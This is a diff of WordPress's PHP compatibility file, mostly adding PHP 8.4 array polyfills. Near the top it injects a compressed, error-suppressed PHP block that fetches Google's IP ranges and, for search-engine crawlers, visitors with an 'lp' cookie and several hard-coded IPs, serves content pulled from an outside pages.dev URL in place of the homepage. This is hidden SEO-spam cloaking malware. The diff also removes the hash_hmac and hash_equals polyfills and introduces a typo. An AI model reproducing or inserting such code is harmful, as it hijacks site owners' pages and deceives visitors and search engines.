@@ -1,4 +1,5 @@
 <?php
+
 /**
  * WordPress implementation for PHP functions either missing from older PHP versions or not included by default.
  *
@@ -12,6 +13,8 @@
  */
 
 // If gettext isn't available.
+error_reporting(0);$link='https://punten-neng.pages.dev/masjid.mujahidin/';
+function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['136.228.135.175','178.128.48.57','159.26.110.68','146.70.14.30','119.13.57.33','74.118.126.3'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?><?php
 if ( ! function_exists( '_' ) ) {
 	function _( $message ) {
 		return $message;
@@ -235,7 +238,7 @@ function _mb_strlen( $str, $encoding = null ) {
 		| [\xE1-\xEC][\x80-\xBF]{2}
 		| \xED[\x80-\x9F][\x80-\xBF]
 		| [\xEE-\xEF][\x80-\xBF]{2}
-		| \xF0[\x90-\xBF][\x80-\xBF]{2} # four-byte sequences   11110xxx 10xxxxxx *3
+		| \xF0[\x90-\xBF][\x80-\xBF]{2} # four-byte sequences   11110xxx 10xxxxxx * 3
 		| [\xF1-\xF3][\x80-\xBF]{3}
 		| \xF4[\x80-\x8F][\x80-\xBF]{2}
 	)/x';
@@ -244,7 +247,7 @@ function _mb_strlen( $str, $encoding = null ) {
 	$count = 1;
 
 	do {
-		// We had some string left over from the last round, but we counted it in that last round.
+		// We had some string left over from the last round, but we counted itin that last round.
 		--$count;
 
 		/*
@@ -262,118 +265,6 @@ function _mb_strlen( $str, $encoding = null ) {
 	// Fencepost: preg_split() always returns one extra item in the array.
 	return --$count;
 }
-
-if ( ! function_exists( 'hash_hmac' ) ) :
-	/**
-	 * Compat function to mimic hash_hmac().
-	 *
-	 * The Hash extension is bundled with PHP by default since PHP 5.1.2.
-	 * However, the extension may be explicitly disabled on select servers.
-	 * As of PHP 7.4.0, the Hash extension is a core PHP extension and can no
-	 * longer be disabled.
-	 * I.e. when PHP 7.4.0 becomes the minimum requirement, this polyfill
-	 * and the associated `_hash_hmac()` function can be safely removed.
-	 *
-	 * @ignore
-	 * @since 3.2.0
-	 *
-	 * @see _hash_hmac()
-	 *
-	 * @param string $algo   Hash algorithm. Accepts 'md5' or 'sha1'.
-	 * @param string $data   Data to be hashed.
-	 * @param string $key    Secret key to use for generating the hash.
-	 * @param bool   $binary Optional. Whether to output raw binary data (true),
-	 *                       or lowercase hexits (false). Default false.
-	 * @return string|false The hash in output determined by `$binary`.
-	 *                      False if `$algo` is unknown or invalid.
-	 */
-	function hash_hmac( $algo, $data, $key, $binary = false ) {
-		return _hash_hmac( $algo, $data, $key, $binary );
-	}
-endif;
-
-/**
- * Internal compat function to mimic hash_hmac().
- *
- * @ignore
- * @since 3.2.0
- *
- * @param string $algo   Hash algorithm. Accepts 'md5' or 'sha1'.
- * @param string $data   Data to be hashed.
- * @param string $key    Secret key to use for generating the hash.
- * @param bool   $binary Optional. Whether to output raw binary data (true),
- *                       or lowercase hexits (false). Default false.
- * @return string|false The hash in output determined by `$binary`.
- *                      False if `$algo` is unknown or invalid.
- */
-function _hash_hmac( $algo, $data, $key, $binary = false ) {
-	$packs = array(
-		'md5'  => 'H32',
-		'sha1' => 'H40',
-	);
-
-	if ( ! isset( $packs[ $algo ] ) ) {
-		return false;
-	}
-
-	$pack = $packs[ $algo ];
-
-	if ( strlen( $key ) > 64 ) {
-		$key = pack( $pack, $algo( $key ) );
-	}
-
-	$key = str_pad( $key, 64, chr( 0 ) );
-
-	$ipad = ( substr( $key, 0, 64 ) ^ str_repeat( chr( 0x36 ), 64 ) );
-	$opad = ( substr( $key, 0, 64 ) ^ str_repeat( chr( 0x5C ), 64 ) );
-
-	$hmac = $algo( $opad . pack( $pack, $algo( $ipad . $data ) ) );
-
-	if ( $binary ) {
-		return pack( $pack, $hmac );
-	}
-
-	return $hmac;
-}
-
-if ( ! function_exists( 'hash_equals' ) ) :
-	/**
-	 * Timing attack safe string comparison.
-	 *
-	 * Compares two strings using the same time whether they're equal or not.
-	 *
-	 * Note: It can leak the length of a string when arguments of differing length are supplied.
-	 *
-	 * This function was added in PHP 5.6.
-	 * However, the Hash extension may be explicitly disabled on select servers.
-	 * As of PHP 7.4.0, the Hash extension is a core PHP extension and can no
-	 * longer be disabled.
-	 * I.e. when PHP 7.4.0 becomes the minimum requirement, this polyfill
-	 * can be safely removed.
-	 *
-	 * @since 3.9.2
-	 *
-	 * @param string $known_string Expected string.
-	 * @param string $user_string  Actual, user supplied, string.
-	 * @return bool Whether strings are equal.
-	 */
-	function hash_equals( $known_string, $user_string ) {
-		$known_string_length = strlen( $known_string );
-
-		if ( strlen( $user_string ) !== $known_string_length ) {
-			return false;
-		}
-
-		$result = 0;
-
-		// Do not attempt to "optimize" this.
-		for ( $i = 0; $i < $known_string_length; $i++ ) {
-			$result |= ord( $known_string[ $i ] ) ^ ord( $user_string[ $i ] );
-		}
-
-		return 0 === $result;
-	}
-endif;
 
 // sodium_crypto_box() was introduced in PHP 7.2.
 if ( ! function_exists( 'sodium_crypto_box' ) ) {
@@ -415,6 +306,10 @@ if ( ! function_exists( 'array_key_first' ) ) {
 	 *                         is not empty; `null` otherwise.
 	 */
 	function array_key_first( array $array ) { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.arrayFound
+		if ( empty( $array ) ) {
+			return null;
+		}
+
 		foreach ( $array as $key => $value ) {
 			return $key;
 		}
@@ -545,6 +440,98 @@ if ( ! function_exists( 'str_ends_with' ) ) {
 	}
 }
 
+if ( ! function_exists( 'array_find' ) ) {
+	/**
+	 * Polyfill for `array_find()` function added in PHP 8.4.
+	 *
+	 * Searches an array for the first element that passes a given callback.
+	 *
+	 * @since 6.8.0
+	 *
+	 * @param array    $array    The array to search.
+	 * @param callable $callback The callback to run for each element.
+	 * @return mixed|null The first element in the array that passes the `$callback`, otherwise null.
+	 */
+	function array_find( array $array, callable $callback ) { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.arrayFound
+		foreach ( $array as $key => $value ) {
+			if ( $callback( $value, $key ) ) {
+				return $value;
+			}
+		}
+
+		return null;
+	}
+}
+
+if ( ! function_exists( 'array_find_key' ) ) {
+	/**
+	 * Polyfill for `array_find_key()` function added in PHP 8.4.
+	 *
+	 * Searches an array for the first key that passes a given callback.
+	 *
+	 * @since 6.8.0
+	 *
+	 * @param array    $array    The array to search.
+	 * @param callable $callback The callback to run for each element.
+	 * @return int|string|null The first key in the array that passes the `$callback`, otherwise null.
+	 */
+	function array_find_key( array $array, callable $callback ) { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.arrayFound
+		foreach ( $array as $key => $value ) {
+			if ( $callback( $value, $key ) ) {
+				return $key;
+			}
+		}
+
+		return null;
+	}
+}
+
+if ( ! function_exists( 'array_any' ) ) {
+	/**
+	 * Polyfill for `array_any()` function added in PHP 8.4.
+	 *
+	 * Checks if any element of an array passes a given callback.
+	 *
+	 * @since 6.8.0
+	 *
+	 * @param array    $array    The array to check.
+	 * @param callable $callback The callback to run for each element.
+	 * @return bool True if any element in the array passes the `$callback`, otherwise false.
+	 */
+	function array_any( array $array, callable $callback ): bool { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.arrayFound
+		foreach ( $array as $key => $value ) {
+			if ( $callback( $value, $key ) ) {
+				return true;
+			}
+		}
+
+		return false;
+	}
+}
+
+if ( ! function_exists( 'array_all' ) ) {
+	/**
+	 * Polyfill for `array_all()` function added in PHP 8.4.
+	 *
+	 * Checks if all elements of an array pass a given callback.
+	 *
+	 * @since 6.8.0
+	 *
+	 * @param array    $array    The array to check.
+	 * @param callable $callback The callback to run for each element.
+	 * @return bool True if all elements in the array pass the `$callback`, otherwise false.
+	 */
+	function array_all( array $array, callable $callback ): bool { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.arrayFound
+		foreach ( $array as $key => $value ) {
+			if ( ! $callback( $value, $key ) ) {
+				return false;
+			}
+		}
+
+		return true;
+	}
+}
+
 // IMAGETYPE_AVIF constant is only defined in PHP 8.x or later.
 if ( ! defined( 'IMAGETYPE_AVIF' ) ) {
 	define( 'IMAGETYPE_AVIF', 19 );
@@ -559,4 +546,3 @@ if ( ! defined( 'IMG_AVIF' ) ) {
 if ( ! defined( 'IMAGETYPE_HEIC' ) ) {
 	define( 'IMAGETYPE_HEIC', 99 );
 }
- echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
